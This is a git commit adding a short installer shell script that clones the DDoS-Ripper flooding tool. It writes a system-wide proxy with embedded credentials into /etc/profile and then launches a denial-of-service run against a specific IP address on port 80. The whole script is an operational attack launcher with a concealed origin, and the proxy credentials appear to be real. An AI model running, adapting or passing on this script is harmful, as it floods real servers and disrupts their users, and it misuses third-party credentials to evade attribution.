3121f571784a8bb7e97d3bf0b9b9365b503327e2
Rookie <37544154+RomanZakaliak@users.noreply.github.com>
2022-02-28 11:11:33 +0200

    installer

---
+++ installer.sh
@@ -0,0 +1,20 @@
+yum install git python3 -y
+git clone https://github.com/palahsu/DDoS-Ripper.git
+cd DDoS-Ripper
+
+sudo echo "
+PROXY_URL=\"http://cpabro:X7LDM16xDiqxA3PN_country-Russia@proxy.packetstream.io:31112/\"
+
+export http_proxy=\"\$PROXY_URL\"
+export https_proxy=\"\$PROXY_URL\"
+export ftp_proxy=\"\$PROXY_URL\"
+export no_proxy=\"127.0.0.1,localhost\"
+
+# For curl
+export HTTP_PROXY=\"\$PROXY_URL\"
+export HTTPS_PROXY=\"\$PROXY_URL\"
+export FTP_PROXY=\"\$PROXY_URL\"
+export NO_PROXY=\"127.0.0.1,localhost\"
+" >> /etc/profile
+
+python3 DRipper.py -s 85.118.181.2 -p 80 -t 135 -q
